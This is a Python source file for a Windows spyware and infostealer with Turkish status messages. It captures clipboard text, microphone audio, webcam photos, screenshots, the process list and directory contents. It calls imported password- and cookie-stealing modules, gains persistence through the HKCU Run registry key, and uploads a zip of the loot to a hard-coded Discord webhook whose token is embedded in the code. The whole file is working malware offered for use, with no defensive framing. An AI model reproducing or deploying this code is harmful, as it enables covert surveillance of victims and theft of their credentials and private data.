import subprocess, pyperclip, pyaudio, wave, cv2, pyautogui, os, winreg, requests, shutil, sys

from steal_passwords import StealPassword
from steal_cookies import StealCookies

StealCookies = StealCookies()
StealPassword = StealPassword()

class Functions:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/1197522282143305828/BdQ3v0V3YpjsPd-Are2VBfMrotFq2GVw9WqHHeJJrsrBrAfF8nro5X8fpbHGoPC7SSXS"

    def stealTasklist(self):
        data = subprocess.check_output(['wmic', 'process', 'list', 'brief'])
        a = str(data)

        try:
            for i in range(len(a)):
                with open("taskLists.txt", "a") as tasklist:
                    tasklist.write(a.split("\\r\\r\\n")[i])

        except IndexError:
            tasklist.close()

        except Exception as e:
            print(f"Error! {e}")

    def clipboard(self):
        try:
            clipboard_text = pyperclip.paste()
            with open("copied.txt", "w") as copiedFile:
                copiedFile.write(str(clipboard_text))

        except Exception as e:
            print(f"Error! {e}")

    def voice(self):
        try:
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            CHUNK = 1024
            RECORD_SECONDS = 5
            WAVE_OUTPUT_FILENAME = "output.wav"

            audio = pyaudio.PyAudio()

            stream = audio.open(format=FORMAT, channels=CHANNELS,
                                rate=RATE, input=True,
                                frames_per_buffer=CHUNK)

            print("Kayıt başlıyor...")

            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            print("Kayıt tamamlandı.")

            stream.stop_stream()
            stream.close()
            audio.terminate()

            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
        except Exception as e:
            print(f"Error! {e}")

    def take_photo(self):
        try:
            camera = cv2.VideoCapture(0)
            if not camera:
                print("Kamera başlatılamadı!")
                pass

            ret, frame = camera.read()

            if ret:
                cv2.imwrite("photo.png", frame)
                print("Fotoğraf çekme başarılı!")

            else:
                print("Fotoğraf çekilemedi!")

        except Exception as e:
            print(f"Error! {e}")

    def take_screenshoot(self):
        try:
            pyautogui.screenshot("screenshot.png")
            print("Ekran görüntüsü alındı")
        except Exception as e:
            print(f"Error! {e}")

    def listdir(self):
        try:
            current_directory = os.getcwd()
            files_and_folders = os.listdir(current_directory)
            with open("listdir.txt", "w") as listdirFile:
                listdirFile.write(str(files_and_folders))

        except Exception as e:
            print(f"Error! {e}")

    def get_pwd(self):
        try:
            with open("pwd.txt", "w") as pwdFile:
                pwdFile.write(f"Bulunduğu dizin : {str(os.getcwd())}")
            pwdFile.close()
        except Exception as e:
            print(f"Error! {e}")

    def startup(self):
        try:
            program_name = os.path.basename(sys.argv[0])
            program_path = os.path.abspath(sys.argv[0])

            target_directory = os.path.join(os.environ['LOCALAPPDATA'])
            os.makedirs(target_directory, exist_ok=True)

            target_path = os.path.join(target_directory, program_name)

            shutil.copy(program_path, target_path)

            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, program_name, 0, winreg.REG_SZ, target_path)

            print(f"'{program_name}' başarıyla başlangıç dizinine eklendi.")
        except Exception as e:
            print(f"Hata: {e}")

    def StealPasswords(self):
        StealPassword.main()

    def StealCookies(self):
        StealCookies.main()

    def send_zip_file(self, zip_file_path):
        try:
            print(f"{zip_file_path} dosyası gönderiliyor..")
            with open(zip_file_path, 'rb') as file:
                files = {'file': file}
                response = requests.post(self.webhook, files=files)

            file.close()

            if response.status_code == 200:
                print(f"Dosya başarıyla gönderildi {zip_file_path} dosyası siliniyor")
                os.remove("error.zip")
            else:
                print(f"Dosya gönderilemedi. HTTP status code: {response.status_code}")
        except Exception as e:
            print(f"Error! {e}")